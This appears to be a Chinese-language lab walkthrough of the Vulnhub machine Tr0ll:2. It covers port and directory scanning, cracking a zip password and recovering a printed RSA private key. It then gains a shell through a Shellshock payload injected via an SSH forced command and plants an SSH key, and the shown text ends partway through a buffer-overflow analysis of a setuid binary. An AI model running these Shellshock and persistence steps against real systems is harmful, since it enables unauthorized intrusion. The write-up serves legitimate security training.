---
title: TR0LL:2
date: 2024-03-15  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,pwn]  
permalink: "/Vulnhub/Troll2.html"
---

# TR0LL: 2

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115614.png" alt="image-20240315125553761" style="zoom:50%;" />

放进vmware后先升级一下，打开：

![image-20240315165020307](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115616.png)

首先扫一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115617.png" alt="image-20240315165047154" style="zoom:67%;" />

## 信息搜集

### 端口扫描

```bash
nmap -sV -sT -T4 -p- 10.161.61.134
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-15 04:51 EDT
Nmap scan report for 10.161.61.134
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.33 seconds
```

### 目录扫描

开启了`80`端口，尝试进行扫描，首先先打开看一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115618.png" alt="image-20240315165352712" style="zoom:50%;" />

果然，又来，扫一下：

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.161.61.134 -f -t 200
```

```text
/icons/               (Status: 403) [Size: 287]
/cgi-bin/             (Status: 403) [Size: 289]
/doc/                 (Status: 403) [Size: 285]
/server-status/       (Status: 403) [Size: 295]
```

这扫的啥玩意，重新改一下：

```bash
gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.161.61.134 
```

```text
/.hta                 (Status: 403) [Size: 285]
/.htpasswd            (Status: 403) [Size: 290]
/.htaccess            (Status: 403) [Size: 290]
/cgi-bin/             (Status: 403) [Size: 289]
/index                (Status: 200) [Size: 110]
/index.html           (Status: 200) [Size: 110]
/robots.txt           (Status: 200) [Size: 346]
/robots               (Status: 200) [Size: 346]
/server-status        (Status: 403) [Size: 294]
```

等的时候手工探测一下：

```text
http://10.161.61.134/robots.txt
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
```

尝试看一下这些目录：

没发现啥东西，只有一张图片，等下没思路可以看看有没有什么隐藏文件。

## 漏洞发掘

### 尝试ftp登录

账号密码均使用`Tr0ll`:

```text
Connected to 10.161.61.134.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (10.161.61.134:kali): Tr0ll
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||32246|).
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04  2014 lmao.zip
226 Directory send OK.
ftp> get lmao.zip
local: lmao.zip remote: lmao.zip
229 Entering Extended Passive Mode (|||19663|).
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
100% |**************************************************************|  1474        2.95 MiB/s    00:00 ETA
226 Transfer complete.
1474 bytes received in 00:00 (1.02 MiB/s)
ftp> exit
221 Goodbye.
```

### 查看敏感文件

先查看一下文件是啥，发现是压缩包，解压看一下：

```bash
┌──(kali㉿kali)-[~]
└─$ file lmao.zip                
lmao.zip: Zip archive data, at least v2.0 to extract, compression method=deflate

┌──(kali㉿kali)-[~]
└─$ unzip lmao.zip              
Archive:  lmao.zip
[lmao.zip] noob password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: noob                    incorrect password
```

猜想是不是伪加密，尝试拿出来看一下：

> 可以参考：https://blog.csdn.net/Goodric/article/details/117599617

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115619.png" alt="image-20240315171346126" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115620.png" alt="image-20240315171358831" style="zoom:50%;" />

### 尝试爆破，未果

还真加密了，把刚刚的目录爆破一下：字典就设为`robots.txt`加上`robots.txt里的内容`：

```bash
sed 's/\///g' temp.txt >> temp.txt
```

```text
/robots.txt
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop
robots.txt
noob
nope
try_harder
keep_trying
isnt_this_annoying
nothing_here
404
LOL_at_the_last_one
trolling_is_fun
zomg_is_this_it
you_found_me
I_know_this_sucks
You_could_give_up
dont_bother
will_it_ever_end
I_hope_you_scripted_this
ok_this_is_it
stop_whining
why_are_you_still_looking
just_quit
seriously_stop
```

进行爆破，但是没找到密码。

继续信息搜集。

## 信息搜集

### FUZZ

刚刚查看的时候发现有的目录无法打开有的则有照片，fuzz一下，看看哪些在使用：

```bash
wfuzz -c --hc 404 -w temp.txt http://10.161.61.134/FUZZ
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115621.png" alt="image-20240315173714609" style="zoom: 50%;" />

应该都是同一张照片，现在也没其他路子了，尝试下载下来查看一下

### 隐写分析

全部下载下来以后，看到大小有区别：

```bash
wget http://10.161.61.134/ok_this_is_it/cat_the_troll.jpg -O tr0ll1.jpg  # 输错了，但是也正常下载了
wget http://10.161.61.134/dont_bother/cat_the_troll.jpg -O tr0ll2.jpg
wget http://10.161.61.134/keep_trying/cat_the_troll.jpg -O tr0ll3.jpg
wget http://10.161.61.134/noob/cat_the_troll.jpg -O tr0ll4.jpg
```

查看大小，发现有一个大小不一样：

```text
┌──(kali㉿kali)-[~/temp/Tr0ll]
└─$ ls -l *.jpg 
-rw-r--r-- 1 kali kali 15831 Oct  4  2014 tr0ll1.jpg
-rw-r--r-- 1 kali kali 15873 Oct  4  2014 tr0ll2.jpg
-rw-r--r-- 1 kali kali 15831 Oct  4  2014 tr0ll3.jpg
-rw-r--r-- 1 kali kali 15831 Oct  4  2014 tr0ll4.jpg
```

进行分析：

```
strings tr0ll2.jpg
```

发现有一个提示：

```text
Look Deep within y0ur_self for the answer
```

### 查看提示

打开看一下这个目录：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115622.png" alt="image-20240315175337935" style="zoom:50%;" />

打开发现是一个字典：

![image-20240315175421749](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115623.png)

一看就是base64编码的，不过也得小心被作者给六了，进行解码以后放进这个字典进行爆破：

```bash
wget http://10.161.61.134/y0ur_self/answer.txt
base64 -d answer.txt > answer2.txt
fcrackzip -u -D -p answer.txt lmao.zip
fcrackzip -u -D -p answer2.txt lmao.zip
```

- `-u`: 这个选项告诉`fcrackzip`只尝试破解加密ZIP文件的密码，而不是解压缩文件。如果不使用这个选项，默认情况下它会尝试解压缩文件。
- `-D`: 这个选项告诉`fcrackzip`使用字典攻击。它会尝试使用指定的字典文件中的单词作为密码来解锁ZIP文件。
- `-p answer.txt`: 这个选项指定了字典文件的路径。在这个例子中，`answer.txt`是你希望`fcrackzip`使用的字典文件的路径。
- `lmao.zip`: 这是要破解的ZIP文件的名称。你需要将这个参数替换为你要尝试破解的实际ZIP文件的路径和名称。

发现密码：

```text
PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL
```

害，老话说的果然没错，渗透测试最终还是信息搜集。。。。

查看一下有啥消息：

```bash
┌──(kali㉿kali)-[~/temp/Tr0ll]
└─$ unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: 
  inflating: noob                    
                                                             
┌──(kali㉿kali)-[~/temp/Tr0ll]
└─$ ls         
answer2.txt  answer.txt  lmao.zip  noob  temp.txt  tr0ll1.jpg  tr0ll2.jpg  tr0ll3.jpg  tr0ll4.jpg
                                                               
┌──(kali㉿kali)-[~/temp/Tr0ll]
└─$ cat noob    
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----

```

是一个私钥，nice！！

## 获取用户

### ssh登录shellShock

```
ssh noob@10.161.61.134 -i noob
```

但是还是需要密码，离谱：

```bash
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i noob noob@10.161.61.134 
```

进去了，又好像没进去：

```text
TRY HARDER LOL!
Connection to 10.161.61.134 closed.
```

查看一下发生了啥：

```bash
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i noob noob@10.161.61.134 -v
```

```text
OpenSSH_9.6p1 Debian-3, OpenSSL 3.1.4 24 Oct 2023
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.161.61.134 [10.161.61.134] port 22.
debug1: Connection established.
debug1: identity file noob type -1
debug1: identity file noob-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_9.6p1 Debian-3
debug1: Remote protocol version 2.0, remote software version OpenSSH_5.9p1 Debian-5ubuntu1.4
debug1: compat_banner: match: OpenSSH_5.9p1 Debian-5ubuntu1.4 pat OpenSSH_5* compat 0x0c000002
debug1: Authenticating to 10.161.61.134:22 as 'noob'
debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: ecdh-sha2-nistp256
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: aes128-ctr MAC: umac-64@openssh.com compression: none
debug1: kex: client->server cipher: aes128-ctr MAC: umac-64@openssh.com compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: SSH2_MSG_KEX_ECDH_REPLY received
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:I3xuSgcBlIsoldKTkOyVYwx8B4NLGl0fDDTi0H6ExYg
debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
debug1: Host '10.161.61.134' is known and matches the ECDSA host key.
debug1: Found key in /home/kali/.ssh/known_hosts:24
debug1: rekey out after 4294967296 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey in after 4294967296 blocks
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey,password
debug1: Next authentication method: publickey
debug1: get_agent_identities: bound agent to hostkey
debug1: get_agent_identities: ssh_fetch_identitylist: agent contains no identities
debug1: Will attempt key: noob  explicit
debug1: Trying private key: noob
Authenticated to 10.161.61.134 ([10.161.61.134]:22) using "publickey".
debug1: channel 0: new session [client-session] (inactive timeout: 0)
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: filesystem
debug1: Remote: Forced command.          //所以是可以执行的！！！
debug1: Sending environment.
debug1: channel 0: setting env LANG = "en_US.UTF-8"
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
TRY HARDER LOL!
debug1: channel 0: free: client-session, nchannels 1
Connection to 10.161.61.134 closed.
Transferred: sent 2912, received 1712 bytes, in 0.1 seconds
Bytes per second: sent 52348.4, received 30776.2
debug1: Exit status 0
```

尝试弹一个shell：

> shellshock:通常，用户可以通过将单个命令附加到 SSH 命令来通过 SSH 执行该命令。使用强制命令时，附加命令将被忽略，但它存储在 SSH_ORIGINAL_COMMAND 环境变量中 。然后可以通过在原始命令中包含 Shellshock 有效负载来利用此功能。然后，在运行强制命令之前，有效负载将自动执行。
>
> 参考：https://github.com/jeholliday/shellshock
>
> https://gabb4r.gitbook.io/oscp-notes/web-http/shellshock

```bash
$ ssh <user>@<server address> '() { :; }; echo "pwned"'
```

尝试一下：

```bash
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i noob noob@10.161.61.134 '() { :; }; echo "pwned"'
# pwned
# TRY HARDER LOL!
```

说明是有这个漏洞的，尝试进行利用：

```bash
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i noob noob@10.161.61.134 '() { :;}; /bin/bash'
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115624.png" alt="image-20240315190005138" style="zoom:50%;" />

获取到了shell，不过感觉交互性不是很好，尝试传一个公钥上去，实现ssh登录：

```bash
# kali
ssh-keygen -b 2048 -t rsa
```

```bash
# noob
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDjqj8kG2CV+EIp0gPIsGtgoFz7zkhFZDzeunBU9PWcQTOaO85F/LBFxD8+EVkGjSB1CRfQReTlUEmhctbA0xVYFOlHGi94m9otYKS5J8R2xKZEjJklP7YvWyOtm/XDfNCn5p99J0pZhVfziHvkLLngkRsRCGSrJbP0abmSYtDl3fIC3hOwtxripIZbTuaRGZ2sJpgXIvbr8ObSAKHPcAnkT4f9mJDn+J8umnnsW2LU2okv56QoGyuaIHbNFU9KSMu8N1e48gxSmwFNlOONxynNg9V0m4qzZ4VBPNes2dfupMsuETRZHkV7TcVqAcnud59IW8N/O+vxZpc6St7Wfaed kali@kali'> .ssh/authorized_keys
```

然后即可尝试进行登陆：

```bash
ssh noob@10.161.61.134 -i Tr0llssh -o PubkeyAcceptedKeyTypes=ssh-rsa
# 这里的Tr0llssh是我的私钥的名字
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115625.png" alt="image-20240315190801463" style="zoom:50%;" />

## 提权

### 查看常见漏洞以及系统信息

尽量不内核提权了，没啥意思，一把梭的东西。。

```text
noob@Tr0ll2:~$ whoami;id
noob
uid=1002(noob) gid=1002(noob) groups=1002(noob)
noob@Tr0ll2:~$ uname -a
Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
noob@Tr0ll2:~$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 12.04.1 LTS
Release:        12.04
Codename:       precise
noob@Tr0ll2:~$ find / -perm -u=s -type f 2>/dev/null
/bin/su
/bin/umount                                                         
/bin/ping
/bin/mount
/bin/fusermount
/bin/ping6
/usr/bin/chfn
/usr/bin/at
/usr/bin/newgrp
/usr/bin/sudoedit
/usr/bin/passwd
/usr/bin/mtr
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/sbin/pppd
/usr/sbin/uuidd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/nothing_to_see_here/choose_wisely/door2/r00t
/nothing_to_see_here/choose_wisely/door3/r00t
/nothing_to_see_here/choose_wisely/door1/r00t
noob@Tr0ll2:~$ crontab -l
no crontab for noob
```

尝试`sudo su`可惜没密码。

查看一下这个可疑文件`r00t`，不出意外的话应该就是我们需要搞定的东西了！

```bash
noob@Tr0ll2:~$ cd /nothing_to_see_here/choose_wisely/door1/
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ls
r00t
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ file
Usage: file [-bchikLlNnprsvz0] [--apple] [--mime-encoding] [--mime-type]
            [-e testname] [-F separator] [-f namefile] [-m magicfiles] file ...
       file -C [-m magicfiles]
       file [--help]
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ file r00t
r00t: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x80ac0ab3dd7ab04707b2fec1a7bca030e20e4654, not stripped
```

坏了，可能要靠pwn了！

### pwn r00t

想先拿到本地来：

```bash
python -m SimpleHTTPServer 8080
```

但是：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115626.png" alt="image-20240315191638654" style="zoom:50%;" />

先远程浅浅分析一下吧，实在不行等下再拿到本地来：

先运行一下：

```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t

2 MINUTE HARD MODE LOL
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ cd ../
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ cd door2
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t
Usage: ./r00t input
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ cd ../door3;./r00t
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
whoanoob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ whoa
Broadcast message from noob@Tr0ll2
        (/dev/pts/0) at 4:42 ...

The system is going down for reboot NOW!

```

嘶，好像一运行就会崩掉，分析一下

```bash
strings r00t
# -bash: /usr/bin/strings: Permission denied
readelf -h r00t /nothing_to_see_here/choose_wisely/door2/r00t
# readelf: Error: 'r00t': No such file
# File: /nothing_to_see_here/choose_wisely/door2/r00t
# ELF Header:
#   Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
#   Class:                             ELF32
#   Data:                              2's complement, little endian
#   Version:                           1 (current)
#   OS/ABI:                            UNIX - System V
#   ABI Version:                       0
#   Type:                              EXEC (Executable file)
#   Machine:                           Intel 80386
#   Version:                           0x1
#   Entry point address:               0x80483b0
#   Start of program headers:          52 (bytes into file)
#   Start of section headers:          4424 (bytes into file)
#   Flags:                             0x0
#   Size of this header:               52 (bytes)
#   Size of program headers:           32 (bytes)
#   Number of program headers:         9
#   Size of section headers:           40 (bytes)
#   Number of section headers:         30
#   Section header string table index: 27
xxd r00t
# 0000000: 7f45 4c46 0101 0100 0000 0000 0000 0000  .ELF............
# 0000010: 0200 0300 0100 0000 b083 0408 3400 0000  ............4...
# 0000020: 4811 0000 0000 0000 3400 2000 0900 2800  H.......4. ...(.
# 0000030: 1e00 1b00 0600 0000 3400 0000 3480 0408  ........4...4...
# 0000040: 3480 0408 2001 0000 2001 0000 0500 0000  4... ... .......
# 0000050: 0400 0000 0300 0000 5401 0000 5481 0408  ........T...T...
# 0000060: 5481 0408 1300 0000 1300 0000 0400 0000  T...............
# 0000070: 0100 0000 0100 0000 0000 0000 0080 0408  ................
# 0000080: 0080 0408 d006 0000 d006 0000 0500 0000  ................
# 0000090: 0010 0000 0100 0000 140f 0000 149f 0408  ................
# 00000a0: 149f 0408 0c01 0000 1401 0000 0600 0000  ................
# 00000b0: 0010 0000 0200 0000 280f 0000 289f 0408  ........(...(...
# 00000c0: 289f 0408 c800 0000 c800 0000 0600 0000  (...............
# 00000d0: 0400 0000 0400 0000 6801 0000 6881 0408  ........h...h...
# 00000e0: 6881 0408 4400 0000 4400 0000 0400 0000  h...D...D.......
# 00000f0: 0400 0000 50e5 7464 d805 0000 d885 0408  ....P.td........
..........
# 有三个门都有这个r00t,逐一分析吧
gdb ./r00t
# GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
# Copyright (C) 2012 Free Software Foundation, Inc.
# License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
# This is free software: you are free to change and redistribute it.
# There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
# and "show warranty" for details.
# This GDB was configured as "i686-linux-gnu".
# For bug reporting instructions, please see:
# <http://bugs.launchpad.net/gdb-linaro/>...
# Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t...done.
(gdb) disassemble main
# Dump of assembler code for function main:
#    0x08048444 <+0>:     push   %ebp
#    0x08048445 <+1>:     mov    %esp,%ebp
#    0x08048447 <+3>:     and    $0xfffffff0,%esp
#    0x0804844a <+6>:     sub    $0x110,%esp
#    0x08048450 <+12>:    cmpl   $0x1,0x8(%ebp)
#    0x08048454 <+16>:    jne    0x8048478 <main+52>
#    0x08048456 <+18>:    mov    0xc(%ebp),%eax
#    0x08048459 <+21>:    mov    (%eax),%edx
#    0x0804845b <+23>:    mov    $0x8048580,%eax
#    0x08048460 <+28>:    mov    %edx,0x4(%esp)
#    0x08048464 <+32>:    mov    %eax,(%esp)
#    0x08048467 <+35>:    call   0x8048340 <printf@plt>
#    0x0804846c <+40>:    movl   $0x0,(%esp)
#    0x08048473 <+47>:    call   0x8048370 <exit@plt>
#    0x08048478 <+52>:    mov    0xc(%ebp),%eax
#    0x0804847b <+55>:    add    $0x4,%eax
#    0x0804847e <+58>:    mov    (%eax),%eax
#    0x08048480 <+60>:    mov    %eax,0x4(%esp)
#    0x08048484 <+64>:    lea    0x10(%esp),%eax
#    0x08048488 <+68>:    mov    %eax,(%esp)
#    0x0804848b <+71>:    call   0x8048350 <strcpy@plt>
#    0x08048490 <+76>:    mov    $0x8048591,%eax
#    0x08048495 <+81>:    lea    0x10(%esp),%edx
#    0x08048499 <+85>:    mov    %edx,0x4(%esp)
#    0x0804849d <+89>:    mov    %eax,(%esp)
#    0x080484a0 <+92>:    call   0x8048340 <printf@plt>
#    0x080484a5 <+97>:    leave  
#    0x080484a6 <+98>:    ret    
# End of assembler dump.
```

发现了一个`strcpy`函数，不知道阔步阔以进行利用。

先打一个长点的字符串看看有没有反应：

```bash
./r00t $(python -c 'print "A" * 1000')
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115627.png" alt="image-20240315194133441" style="zoom:50%;" />

神奇，忽隐忽现的，又出现了，但是好像没有溢出欸，我擦搞错了，重来:

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115628.png" alt="image-20240315194648415" style="zoom:50%;" />

一运行就会改权限或者踢出去？行（xieng）每次重新启动时都会更改彼此的行为是吧！

> **注意：** r00t 程序经常更改其门目录，需要记住。还有一个“HARD MODE”，可以阻止在 2 分钟内使用“ls”。另外，记住是否看到消息“Good job, stand by, executing root shell….”。这是一个陷阱，连接将被关闭，需要立即使用“Ctrl + c”终止程序并将目录更改为任何其他door。

![image-20240315195246779](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115629.png)

谢特！

再来：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403152115630.png" alt="image-20240315195354319" style="zoom:50%;" />

看来确实是存在缓冲区溢出的漏洞的。

这样的话刚刚分析错了？看一下这个的汇编代码：

```bash
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ gdb -q r00t
# Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.
(gdb) disassemble main
# Dump of assembler code for function main:
#    0x08048444 <+0>:     push   %ebp
#    0x08048445 <+1>:     mov    %esp,%ebp
#    0x08048447 <+3>:     and    $0xfffffff0,%esp
#    0x0804844a <+6>:     sub    $0x110,%esp
#    0x08048450 <+12>:    cmpl   $0x1,0x8(%ebp)
#    0x08048454 <+16>:    jne    0x8048478 <main+52>
#    0x08048456 <+18>:    mov    0xc(%ebp),%eax
#    0x08048459 <+21>:    mov    (%eax),%edx
#    0x0804845b <+23>:    mov    $0x8048580,%eax
#    0x08048460 <+28>:    mov    %edx,0x4(%esp)
#    0x08048464 <+32>:    mov    %eax,(%esp)
#    0x08048467 <+35>:    call   0x8048340 <printf@plt>
#    0x0804846c <+40>:    movl   $0x0,(%esp)
#    0x08048473 <+47>:    call   0x8048370 <exit@plt>
#    0x08048478 <+52>:    mov    0xc(%ebp),%eax
#    0x0804847b <+55>:    add    $0x4,%eax
#    0x0804847e <+58>:    mov    (%eax),%eax
#    0x08048480 <+60>:    mov    %eax,0x4(%esp)
#    0x08048484 <+64>:    lea    0x10(%esp),%eax
#    0x08048488 <+68>:    mov    %eax,(%esp)
#    0x0804848b <+71>:    call   0x8048350 <strcpy@plt>
#    0x08048490 <+76>:    mov    $0x8048591,%eax
#    0x08048495 <+81>:    lea    0x10(%esp),%edx
#    0x08048499 <+85>:    mov    %edx,0x4(%esp)
#    0x0804849d <+89>:    mov    %eax,(%esp)
#    0x080484a0 <+92>:    call   0x8048340 <printf@plt>
#    0x080484a5 <+97>:    leave  
#    0x080484a6 <+98>:    ret    
# End of assembler dump.
```

ok，还是有的，尝试进行了利用！！！

#### 查看偏移量

先确定一下偏移量，使用`metasploit`的工具确定一下：

```bash
# kali
locate pattern_create.rb
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
